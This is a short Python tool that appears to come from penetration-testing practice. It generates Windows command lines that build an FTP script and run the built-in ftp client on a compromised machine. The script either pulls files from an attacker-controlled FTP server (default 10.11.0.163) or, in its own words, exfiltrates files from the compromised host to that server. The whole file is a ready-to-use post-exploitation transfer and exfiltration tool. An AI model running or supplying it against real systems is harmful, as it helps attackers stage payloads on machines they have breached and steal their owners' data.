#!/usr/bin/env python3
from string import Template

template = """echo open $ip $port > ftp.txt
echo USER anonymous >> ftp.txt
echo ftp >> ftp.txt
echo bin >> ftp.txt
$transfer_commands
echo bye >> ftp.txt
ftp -v -n -s:ftp.txt"""


DEFAULT_IP = '10.11.0.163'
DEFAULT_PORT = 21

def get_arguments():
    from argparse import ArgumentParser

    parser = ArgumentParser(
                description="Almost all Windows version should have an ftp client installed which can be used for the "
                            "file transfers. This tool provides you with a "
                            "generated list of commands, that you can easily copy-pasted into the target's shell.")
    parser.add_argument('--ip', dest='ip',
                        required=False,
                        default=DEFAULT_IP,
                        help='IP of the FTP server to connect to')
    parser.add_argument('--port', dest='port',
                        required=False,
                        default=DEFAULT_PORT,
                        help='Port of the FTP server to connect to')
    parser.add_argument('--get', dest='get', nargs="+",
                        required=False,
                        help='Download files from the FTP server, file names separated by space')
    parser.add_argument('--put', dest='put', nargs="+",
                        required=False,
                        help='Exfiltrate files from the compromised machine to the FTP server. You must provide '
                             'absolute paths to the files, separated by space.')
    options = parser.parse_args()

    return options


options = get_arguments()

if __name__ == '__main__':
    ip, port = options.ip, options.port
    t = Template(template)
    if options.get:
        files = options.get
        getfiles = '\n'.join([f"echo GET {f} >> ftp.txt" for f in files])
        print(t.substitute(ip=ip, port=port, transfer_commands=getfiles))
    elif options.put:
        files = options.put
        putfiles = '\n'.join([f"echo PUT {f} >> ftp.txt" for f in files])
        print(t.substitute(ip=ip, port=port, transfer_commands=putfiles))
    else:
        raise Exception('--get or --put arg must be given')
